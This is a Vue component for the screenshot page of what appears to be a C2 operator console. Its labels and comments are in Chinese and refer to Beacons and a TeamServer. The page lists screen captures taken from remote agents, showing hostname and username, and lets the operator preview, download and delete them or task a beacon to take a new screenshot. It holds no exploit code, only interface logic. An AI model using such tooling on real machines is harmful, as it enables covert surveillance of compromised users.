<script setup>
/**
 * ScreenshotsPage - 截图管理页面
 * 展示所有 Beacon 的截图列表，支持按 Agent 过滤、
 * 大图预览、下载到本地、请求新截图、删除。
 */

import { computed, onMounted, ref, watch } from 'vue'
import { Dialogs } from '@wailsio/runtime'
import * as FileService from '../../bindings/changeme/service/fileservice.js'
import {
  deleteScreenshot as deleteScreenshotApi,
  downloadScreenshotBase64,
  requestScreenshot as requestScreenshotApi,
} from '../features/screenshots/api/screenshotApi.js'
import { useAgentStore } from '../stores/agent.js'
import { useModalStore } from '../stores/modal.js'
import { useNotificationStore } from '../stores/notification.js'
import { useScreenshotStore } from '../stores/screenshot.js'
import PageTitleIcon from '../components/common/PageTitleIcon.vue'

const agentStore = useAgentStore()
const modalStore = useModalStore()
const notificationStore = useNotificationStore()
const screenshotStore = useScreenshotStore()

const selectedBeaconId = ref('')
const monitorId = ref(0)
const quality = ref(80)
const requestLoading = ref(false)
const savingShotId = ref('')
const deletingShotId = ref('')

const preview = ref({
  visible: false,
  loading: false,
  shot: null,
  src: '',
})

const screenshots = computed(() => screenshotStore.screenshots)
const loading = computed(() => screenshotStore.loading)
const errorMessage = computed(() => screenshotStore.error)
const availableAgents = computed(() => {
  return [...agentStore.agents].sort((a, b) => {
    const left = a.hostname || a.beaconid || ''
    const right = b.hostname || b.beaconid || ''
    return left.localeCompare(right)
  })
})

watch(availableAgents, (agents) => {
  if (!agents.length) {
    selectedBeaconId.value = ''
    return
  }

  const current = agents.find(agent => agent.beaconid === selectedBeaconId.value)
  if (!current) {
    selectedBeaconId.value = agents[0].beaconid
  }
}, { immediate: true })

function shortId(value) {
  if (!value) return '-'
  return String(value).substring(0, 8)
}

function formatSize(bytes) {
  const value = Number(bytes || 0)
  if (value === 0) return '0 B'
  const units = ['B', 'KB', 'MB', 'GB', 'TB']
  const index = Math.min(Math.floor(Math.log(value) / Math.log(1024)), units.length - 1)
  return `${(value / Math.pow(1024, index)).toFixed(index === 0 ? 0 : 2)} ${units[index]}`
}

function formatTime(value) {
  if (!value) return '-'
  const numeric = Number(value)
  const date = Number.isFinite(numeric)
    ? new Date(numeric < 1e12 ? numeric * 1000 : numeric)
    : new Date(value)
  return date.toLocaleString('zh-CN', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  })
}

async function refreshScreenshots() {
  try {
    await screenshotStore.fetchScreenshots()
  } catch (err) {
    console.error('[ScreenshotsPage] 获取截图列表失败:', err)
  }
}

async function requestScreenshot() {
  if (!selectedBeaconId.value) {
    notificationStore.warn('请先选择 Beacon')
    return
  }

  const monitor = monitorId.value
  const shotQuality = quality.value
  if (!Number.isInteger(monitor) || monitor < 0) {
    notificationStore.warn('monitor_id 必须是非负整数')
    return
  }
  if (!Number.isInteger(shotQuality) || shotQuality < 1 || shotQuality > 100) {
    notificationStore.warn('quality 需要在 1 到 100 之间')
    return
  }

  requestLoading.value = true
  try {
    await requestScreenshotApi(selectedBeaconId.value, monitor, shotQuality)
    notificationStore.success('截图任务已下发，等待任务回传')
  } catch (err) {
    console.error('[ScreenshotsPage] 下发截图任务失败:', err)
  } finally {
    requestLoading.value = false
  }
}

async function openPreview(shot) {
  preview.value = {
    visible: true,
    loading: true,
    shot,
    src: '',
  }

  try {
    const base64 = await downloadScreenshotBase64({
      screenshotId: shot.screenshotId,
      downloadUrl: shot.previewUrl,
    })
    preview.value.src = `data:image/jpeg;base64,${base64}`
  } catch (err) {
    notificationStore.error(err.message || '加载截图预览失败')
    closePreview()
  } finally {
    preview.value.loading = false
  }
}

function closePreview() {
  preview.value = {
    visible: false,
    loading: false,
    shot: null,
    src: '',
  }
}

async function saveScreenshot(shot) {
  if (!shot?.screenshotId && !shot?.downloadUrl) return

  const savePath = await Dialogs.SaveFile({
    Title: '保存截图',
    Filename: shot.fileName || 'screenshot.jpg',
  })
  if (!savePath) return

  const key = shot.screenshotId || shot.downloadUrl
  savingShotId.value = key
  try {
    const base64Data = await downloadScreenshotBase64({
      screenshotId: shot.screenshotId,
      downloadUrl: shot.downloadUrl,
    })
    await FileService.WriteBinaryFile(savePath, base64Data)
    notificationStore.success(`已保存: ${shot.fileName || 'screenshot.jpg'}`)
  } catch (err) {
    notificationStore.error(`保存截图失败: ${err.message || err}`)
  } finally {
    savingShotId.value = ''
  }
}

async function deleteScreenshot(shot) {
  if (!shot?.screenshotId) return

  const confirmed = await modalStore.showConfirm({
    title: '删除截图',
    message: `确定要删除截图 ${shot.fileName || shot.screenshotId} 吗？`,
    type: 'danger',
  })
  if (!confirmed) return

  deletingShotId.value = shot.screenshotId
  try {
    await deleteScreenshotApi(shot.screenshotId)
    screenshotStore.removeScreenshot(shot)
    if (preview.value.visible && preview.value.shot?.screenshotId === shot.screenshotId) {
      closePreview()
    }
    notificationStore.success(`已删除: ${shot.fileName || shot.screenshotId}`)
  } catch (err) {
    notificationStore.error(`删除截图失败: ${err.message || err}`)
  } finally {
    deletingShotId.value = ''
  }
}

onMounted(refreshScreenshots)
</script>

<template>
  <div class="page-container screenshots-page">
    <header class="page-header">
      <div class="header-left">
        <h1 class="page-title">
          <PageTitleIcon name="screenshots" />
          屏幕截图
        </h1>
        <p class="page-subtitle">查看已保存的截图，并向指定 Beacon 下发新的截图任务</p>
      </div>

      <div class="header-actions">
        <div class="control-group">
          <label>Beacon</label>
          <select v-model="selectedBeaconId" class="form-control select-control">
            <option value="" disabled>请选择 Beacon</option>
            <option v-for="agent in availableAgents" :key="agent.beaconid" :value="agent.beaconid">
              {{ agent.hostname || 'Unknown' }} · {{ shortId(agent.beaconid) }}
            </option>
          </select>
        </div>

        <div class="control-group small">
          <label>Monitor</label>
          <input v-model.number="monitorId" type="number" min="0" step="1" class="form-control number-control" />
        </div>

        <div class="control-group small">
          <label>Quality</label>
          <input v-model.number="quality" type="number" min="1" max="100" step="1" class="form-control number-control" />
        </div>

        <button class="btn btn-primary" :disabled="requestLoading || !selectedBeaconId" @click="requestScreenshot">
          <span class="icon">📸</span>
          {{ requestLoading ? '下发中...' : '下发截图' }}
        </button>

        <button class="btn btn-secondary" :disabled="loading" @click="refreshScreenshots">
          <span class="icon">↻</span>
          {{ loading ? '刷新中...' : '刷新列表' }}
        </button>
      </div>
    </header>

    <div class="content-panel">
      <div v-if="errorMessage" class="state-line error-state">
        {{ errorMessage }}
      </div>

      <div v-if="loading && screenshots.length === 0" class="state-line">
        正在读取截图列表...
      </div>

      <div v-else class="table-scroll">
        <table class="data-table">
          <thead>
            <tr>
              <th>捕获时间</th>
              <th>Beacon</th>
              <th>主机名</th>
              <th>用户</th>
              <th>分辨率</th>
              <th>大小</th>
              <th class="actions-col">操作</th>
            </tr>
          </thead>
          <tbody>
            <tr v-for="shot in screenshots" :key="shot.screenshotId || shot.fileName">
              <td class="cell-time">{{ formatTime(shot.capturedAt) }}</td>
              <td class="cell-id" :title="shot.beaconId">{{ shortId(shot.beaconId) }}</td>
              <td class="cell-hostname">{{ shot.hostname || '-' }}</td>
              <td class="cell-user">{{ shot.username || '-' }}</td>
              <td>
                <span class="tag-res">{{ shot.resolution || '-' }}</span>
              </td>
              <td class="cell-size">{{ formatSize(shot.imageSize) }}</td>
              <td class="actions-col">
                <button class="action-btn" @click="openPreview(shot)">预览</button>
                <button
                  class="action-btn"
                  :disabled="savingShotId === (shot.screenshotId || shot.downloadUrl)"
                  @click="saveScreenshot(shot)"
                >
                  {{ savingShotId === (shot.screenshotId || shot.downloadUrl) ? '保存中...' : '下载' }}
                </button>
                <button
                  class="action-btn action-btn-danger"
                  :disabled="deletingShotId === shot.screenshotId"
                  @click="deleteScreenshot(shot)"
                >
                  {{ deletingShotId === shot.screenshotId ? '删除中...' : '删除' }}
                </button>
              </td>
            </tr>

            <tr v-if="screenshots.length === 0 && !loading">
              <td colspan="7" class="empty-cell">TeamServer 暂无截图记录</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    <Teleport to="body">
<div v-if="preview.visible" class="preview-overlay">
        <div class="preview-modal">
          <header class="preview-header">
            <div class="preview-title">
              <span class="icon">🖼️</span>
              <div class="preview-meta">
                <h3>{{ preview.shot?.fileName || '截图预览' }}</h3>
                <span>
                  {{ preview.shot?.hostname || '-' }} · {{ shortId(preview.shot?.beaconId) }} ·
                  {{ formatTime(preview.shot?.capturedAt) }}
                </span>
              </div>
            </div>
            <button class="close-btn" @click="closePreview">×</button>
          </header>

          <div class="preview-body">
            <div v-if="preview.loading" class="preview-state">正在加载截图预览...</div>
            <img v-else-if="preview.src" :src="preview.src" class="preview-image" :alt="preview.shot?.fileName || 'screenshot'" />
            <div v-else class="preview-state">暂无预览内容</div>
          </div>

          <footer class="preview-footer">
            <button class="btn btn-secondary" @click="closePreview">关闭</button>
            <button
              class="btn btn-danger"
              :disabled="!preview.shot || deletingShotId === preview.shot?.screenshotId"
              @click="deleteScreenshot(preview.shot)"
            >
              {{ deletingShotId === preview.shot?.screenshotId ? '删除中...' : '删除截图' }}
            </button>
            <button class="btn btn-primary" :disabled="!preview.shot" @click="saveScreenshot(preview.shot)">
              下载到本地
            </button>
          </footer>
        </div>
      </div>
    </Teleport>
  </div>
</template>

<style scoped>
.page-container {
  padding: 24px;
  height: 100%;
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.page-header {
  display: flex;
  justify-content: space-between;
  align-items: flex-end;
  gap: 16px;
}

.header-left {
  min-width: 0;
}

.page-title {
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 20px;
  font-weight: 600;
  color: var(--text-primary);
  margin-bottom: 4px;
  letter-spacing: -0.5px;
}

.page-subtitle {
  font-size: 13px;
  color: var(--text-muted);
}

.header-actions {
  display: flex;
  align-items: flex-end;
  gap: 10px;
  flex-wrap: wrap;
  justify-content: flex-end;
}

.control-group {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.control-group.small {
  width: 96px;
}

.control-group label {
  font-size: 11px;
  color: var(--text-muted);
  line-height: 1;
}

.form-control {
  height: 38px;
  padding: 0 12px;
  background: rgba(0, 0, 0, 0.03);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text-primary);
  font-size: 13px;
  transition: border-color 0.2s;
}

.form-control:focus {
  border-color: var(--color-primary);
  outline: none;
}

.select-control {
  min-width: 220px;
}

.number-control {
  width: 100%;
}

.btn {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  height: 38px;
  padding: 0 14px;
  border-radius: 6px;
  font-size: 13px;
  font-weight: 500;
  cursor: pointer;
  transition: var(--transition);
  border: 1px solid transparent;
}

.btn-primary {
  background: var(--color-primary);
  color: white;
}

.btn-primary:hover:not(:disabled) {
  background: var(--color-primary-light);
  transform: translateY(-1px);
}

.btn-secondary {
  background: rgba(15, 23, 42, 0.035);
  color: var(--text-primary);
  border-color: var(--border-light);
}

.btn-secondary:hover:not(:disabled) {
  color: var(--color-primary);
  background: rgba(var(--color-primary-rgb), 0.08);
  border-color: rgba(var(--color-primary-rgb), 0.16);
}

.btn-danger {
  background: rgba(239, 68, 68, 0.08);
  color: #dc2626;
  border-color: rgba(239, 68, 68, 0.18);
}

.btn-danger:hover:not(:disabled) {
  background: rgba(239, 68, 68, 0.14);
  color: #b91c1c;
}

.btn:disabled {
  opacity: 0.55;
  cursor: not-allowed;
  transform: none;
}

.content-panel {
  flex: 1;
  min-height: 0;
  background: var(--bg-card);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius-lg);
  backdrop-filter: blur(var(--glass-blur-md)) saturate(150%);
  box-shadow: var(--shadow-sm);
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

.state-line {
  padding: 18px 20px;
  color: #475569;
  font-size: 13px;
  border-bottom: 1px solid rgba(15, 23, 42, 0.08);
  background: rgba(255, 255, 255, 0.96);
}

.table-scroll {
  flex: 1;
  min-height: 0;
  overflow-y: auto;
}

.error-state {
  color: var(--color-danger);
}

.data-table {
  width: 100%;
  border-collapse: collapse;
  text-align: left;
}

.data-table th {
  padding: 12px 16px;
  font-size: 12px;
  font-weight: 500;
  color: #64748b;
  border-bottom: 1px solid rgba(15, 23, 42, 0.08);
  background: #ffffff;
  position: sticky;
  top: 0;
  z-index: 1;
}

.data-table td {
  padding: 12px 16px;
  font-size: 13px;
  border-bottom: 1px solid rgba(15, 23, 42, 0.06);
  vertical-align: middle;
  color: #0f172a;
}

.data-table tbody tr:hover {
  background: #f8fafc;
}

.cell-time,
.cell-id,
.cell-size {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
}

.cell-time,
.cell-size {
  color: #64748b;
}

.cell-id {
  color: #0ea5e9;
}

.cell-hostname {
  font-weight: 500;
  color: var(--text-primary);
}

.cell-user {
  color: #334155;
}

.tag-res {
  display: inline-block;
  padding: 2px 6px;
  background: rgba(99, 102, 241, 0.08);
  border: 1px solid rgba(99, 102, 241, 0.18);
  color: #6366f1;
  border-radius: 4px;
  font-size: 11px;
  font-family: 'JetBrains Mono', monospace;
}

.actions-col {
  text-align: right;
  white-space: nowrap;
}

.action-btn {
  border: 1px solid rgba(15, 23, 42, 0.12);
  background: #ffffff;
  color: #0f172a;
  border-radius: 6px;
  padding: 6px 10px;
  font-size: 12px;
  cursor: pointer;
  transition: var(--transition);
  margin-left: 8px;
}

.action-btn:hover:not(:disabled) {
  color: #4f46e5;
  background: #f8fafc;
}

.action-btn-danger {
  color: #dc2626;
}

.action-btn-danger:hover:not(:disabled) {
  color: #b91c1c;
  background: rgba(239, 68, 68, 0.06);
}

.action-btn:disabled {
  opacity: 0.55;
  cursor: not-allowed;
}

.empty-cell {
  text-align: center;
  padding: 32px !important;
  color: #64748b;
}

.preview-overlay {
  position: fixed;
  inset: 0;
  background: var(--bg-overlay);
  backdrop-filter: blur(4px);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 3000;
}

.preview-modal {
  width: min(1120px, 92vw);
  max-height: 90vh;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  background: var(--bg-card);
  border: 1px solid var(--border-light);
  border-radius: var(--radius-xl);
}

.preview-header {
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  border-bottom: 1px solid var(--border);
  background: rgba(255, 255, 255, 0.4);
}

.preview-title {
  display: flex;
  align-items: center;
  gap: 12px;
  min-width: 0;
}

.preview-title .icon {
  font-size: 24px;
}

.preview-meta {
  display: flex;
  flex-direction: column;
  gap: 2px;
  min-width: 0;
}

.preview-meta h3 {
  margin: 0;
  font-size: 16px;
  font-weight: 600;
  color: var(--text-primary);
}

.preview-meta span {
  font-size: 12px;
  color: var(--text-muted);
}

.close-btn {
  background: transparent;
  border: none;
  font-size: 24px;
  color: var(--text-muted);
  cursor: pointer;
  line-height: 1;
  padding: 4px;
  border-radius: 4px;
  transition: all 0.2s;
}

.close-btn:hover {
  background: rgba(0, 0, 0, 0.05);
  color: var(--text-primary);
}

.preview-body {
  flex: 1;
  min-height: 0;
  padding: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: auto;
  background: rgba(0, 0, 0, 0.02);
}

.preview-state {
  color: var(--text-muted);
  font-size: 13px;
}

.preview-image {
  max-width: 100%;
  max-height: calc(90vh - 180px);
  border-radius: 10px;
}

.preview-footer {
  padding: 16px 20px;
  border-top: 1px solid var(--border);
  background: rgba(0, 0, 0, 0.02);
  display: flex;
  justify-content: flex-end;
  gap: 12px;
}

:global(html[data-ui-theme="dark"] .screenshots-page .page-title) {
  color: #f8fafc;
}

:global(html[data-ui-theme="dark"] .screenshots-page .page-subtitle),
:global(html[data-ui-theme="dark"] .screenshots-page .control-group label) {
  color: #94a3b8;
}

:global(html[data-ui-theme="dark"] .screenshots-page .form-control) {
  color: #e5e7eb;
  background: rgba(15, 23, 42, 0.82);
  border-color: rgba(148, 163, 184, 0.18);
}

:global(html[data-ui-theme="dark"] .screenshots-page .content-panel) {
  background: rgba(15, 23, 42, 0.76);
  border-color: rgba(99, 102, 241, 0.22);
}

:global(html[data-ui-theme="dark"] .screenshots-page .state-line) {
  color: #cbd5e1;
  background: rgba(15, 23, 42, 0.88);
  border-bottom-color: rgba(148, 163, 184, 0.12);
}

:global(html[data-ui-theme="dark"] .screenshots-page .data-table th) {
  color: #94a3b8;
  background: rgba(15, 23, 42, 0.96);
  border-bottom-color: rgba(148, 163, 184, 0.14);
}

:global(html[data-ui-theme="dark"] .screenshots-page .data-table td) {
  color: #dbeafe;
  border-bottom-color: rgba(148, 163, 184, 0.10);
}

:global(html[data-ui-theme="dark"] .screenshots-page .data-table tbody tr) {
  background: rgba(30, 41, 73, 0.54);
}

:global(html[data-ui-theme="dark"] .screenshots-page .data-table tbody tr:hover) {
  background: rgba(51, 65, 105, 0.74);
}

:global(html[data-ui-theme="dark"] .screenshots-page .cell-time),
:global(html[data-ui-theme="dark"] .screenshots-page .cell-size) {
  color: #a7b3c8;
}

:global(html[data-ui-theme="dark"] .screenshots-page .cell-id) {
  color: #22d3ee;
}

:global(html[data-ui-theme="dark"] .screenshots-page .cell-hostname) {
  color: #f1f5f9;
}

:global(html[data-ui-theme="dark"] .screenshots-page .cell-user) {
  color: #cbd5e1;
}

:global(html[data-ui-theme="dark"] .screenshots-page .tag-res) {
  color: #c4b5fd;
  background: rgba(99, 102, 241, 0.22);
  border-color: rgba(129, 140, 248, 0.34);
}

:global(html[data-ui-theme="dark"] .screenshots-page .action-btn) {
  color: #e5e7eb;
  background: rgba(15, 23, 42, 0.92);
  border-color: rgba(148, 163, 184, 0.24);
}

:global(html[data-ui-theme="dark"] .screenshots-page .action-btn:hover:not(:disabled)) {
  color: #c4b5fd;
  background: rgba(79, 70, 229, 0.18);
  border-color: rgba(129, 140, 248, 0.40);
}

:global(html[data-ui-theme="dark"] .screenshots-page .action-btn-danger) {
  color: #fca5a5;
}

:global(html[data-ui-theme="dark"] .screenshots-page .action-btn-danger:hover:not(:disabled)) {
  color: #fecaca;
  background: rgba(239, 68, 68, 0.16);
  border-color: rgba(248, 113, 113, 0.34);
}

:global(html[data-ui-theme="dark"] .screenshots-page .empty-cell) {
  color: #94a3b8;
}

:global(html[data-ui-theme="dark"] .preview-modal) {
  background: rgba(15, 23, 42, 0.96);
  border-color: rgba(148, 163, 184, 0.18);
}

:global(html[data-ui-theme="dark"] .preview-header),
:global(html[data-ui-theme="dark"] .preview-footer) {
  background: rgba(15, 23, 42, 0.88);
  border-color: rgba(148, 163, 184, 0.14);
}

:global(html[data-ui-theme="dark"] .preview-body) {
  background: rgba(2, 6, 23, 0.46);
}
</style>
